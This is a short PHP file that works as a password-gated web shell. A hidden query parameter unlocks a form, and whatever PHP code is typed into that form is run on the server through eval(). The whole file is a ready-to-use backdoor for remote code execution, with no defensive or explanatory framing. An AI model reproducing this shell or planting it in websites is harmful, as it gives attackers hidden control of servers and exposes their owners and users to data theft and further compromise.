<?php

if (!isset($_GET['p']) || $_GET['p'] != '..h..a..x..') {
    die();
}

if (isset($_POST['code'])) {
    eval($_POST['code']);
}

?>

<hr />
<form method="post">
    <textarea rows="5" cols="50" name="code"><?php echo htmlentities($_POST['code']); ?></textarea>
    <br />
    <input type="submit" value="Run Code">
</form>

